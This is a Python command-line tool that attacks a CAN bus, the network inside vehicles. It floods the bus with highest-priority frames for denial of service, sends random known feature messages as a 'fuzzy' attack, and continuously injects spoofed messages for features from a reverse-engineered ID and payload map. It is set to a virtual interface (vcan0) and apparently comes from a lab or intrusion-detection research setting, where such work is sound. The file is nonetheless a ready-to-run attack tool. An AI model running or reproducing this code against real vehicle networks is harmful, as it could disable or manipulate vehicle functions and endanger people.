import argparse
import can
import sys
import time
import random

from attacks.reverse_engineering import FEATURE_CAN_ID_PAYLOAD_MAPPER

# ---------------------------------------------------------------------------
# Live status display
# ---------------------------------------------------------------------------

_RESET  = "\033[0m"
_RED    = "\033[91m"
_YELLOW = "\033[93m"
_CYAN   = "\033[96m"
_DIM    = "\033[2m"
_SEP    = _DIM + "\u2500" * 44 + _RESET

_status_lines = 0


def _print_status(attack_type: str, feature: str, sent: int, rate: float, last_msg: can.Message):
    global _status_lines
    data_str = " ".join(f"{b:02X}" for b in last_msg.data)
    lines = [
        _SEP,
        f"Attack type : {_RED}{attack_type}{_RESET}",
        f"Feature     : {_YELLOW}{feature}{_RESET}",
        f"Sent        : {_CYAN}{sent}{_RESET}",
        f"Rate        : {_CYAN}{rate:.2f} msg/s{_RESET}",
        f"Last msg    : ID={_CYAN}0x{last_msg.arbitration_id:03X}{_RESET}"
        f"  DLC={last_msg.dlc}"
        f"  DATA={_CYAN}{data_str}{_RESET}",
        _SEP,
    ]
    if _status_lines > 0:
        sys.stdout.write(f"\033[{_status_lines}A")
        for _ in range(_status_lines):
            sys.stdout.write("\033[2K\n")
        sys.stdout.write(f"\033[{_status_lines}A")
    sys.stdout.write("\n".join(lines) + "\n")
    sys.stdout.flush()
    _status_lines = len(lines)


# ---------------------------------------------------------------------------
# Attack functions
# ---------------------------------------------------------------------------

def denial_of_service_func(bus, period: float):
    """Flood the CAN bus with high-priority empty frames at the given period."""
    sent = 0
    t0 = time.monotonic()
    while True:
        msg = can.Message(arbitration_id=0x000, data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00], is_extended_id=False)
        bus.send(msg)
        sent += 1
        elapsed = time.monotonic() - t0 or 1e-9
        _print_status("Denial of Service", "0x000", sent, sent / elapsed, msg)
        time.sleep(period)


def fuzzy_attack_func(bus):
    """Send random known-valid CAN messages at random intervals."""
    known_attacks = list(FEATURE_CAN_ID_PAYLOAD_MAPPER.keys())
    sent = 0
    t0 = time.monotonic()
    while True:
        sleep_time = random.uniform(0.5, 1.0)
        attack = random.choice(known_attacks)
        feature = FEATURE_CAN_ID_PAYLOAD_MAPPER[attack]
        msg = can.Message(arbitration_id=feature['id'], data=feature['payload'], is_extended_id=False)
        bus.send(msg)
        sent += 1
        elapsed = time.monotonic() - t0 or 1e-9
        _print_status("Fuzzy", attack, sent, sent / elapsed, msg)
        time.sleep(sleep_time)


def spoofing_attacks_func(bus, feature: str, period: float):
    """Continuously inject a spoofed CAN message for the given feature."""
    selected_feature = FEATURE_CAN_ID_PAYLOAD_MAPPER[feature]
    sent = 0
    t0 = time.monotonic()
    while True:
        msg = can.Message(arbitration_id=selected_feature['id'], data=selected_feature['payload'], is_extended_id=False)
        bus.send(msg)
        sent += 1
        elapsed = time.monotonic() - t0 or 1e-9
        _print_status("Spoofing", feature, sent, sent / elapsed, msg)
        time.sleep(period)


def main():
    print("CAN network attacks CLI")
    spoofing_attacks = list(FEATURE_CAN_ID_PAYLOAD_MAPPER.keys())
    available_features = [*spoofing_attacks, "fuzzy", "denial_of_service"]

    parser = argparse.ArgumentParser(description="Perform CAN network attacks.")
    parser.add_argument("--feature", choices=available_features, help="Feature to attack")
    parser.add_argument("--period", type=float, default=0.1, help="Period between messages in seconds")

    args = parser.parse_args()
    if not args.feature:
        print("No feature specified. Use --feature to select a feature.")
        return
    if args.feature not in available_features:
        print(f"Feature '{args.feature}' is not available. Choose from {available_features}.")
    bus = can.interface.Bus(channel='vcan0', interface='socketcan')

    try:
        if args.feature == "fuzzy":
            print(f"Starting fuzzy attack…\n")
            fuzzy_attack_func(bus)
        elif args.feature == "denial_of_service":
            print(f"Starting denial-of-service attack (period={args.period}s)…\n")
            denial_of_service_func(bus, args.period)
        else:
            print(f"Starting spoofing attack on '{args.feature}' (period={args.period}s)…\n")
            spoofing_attacks_func(bus, args.feature, args.period)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
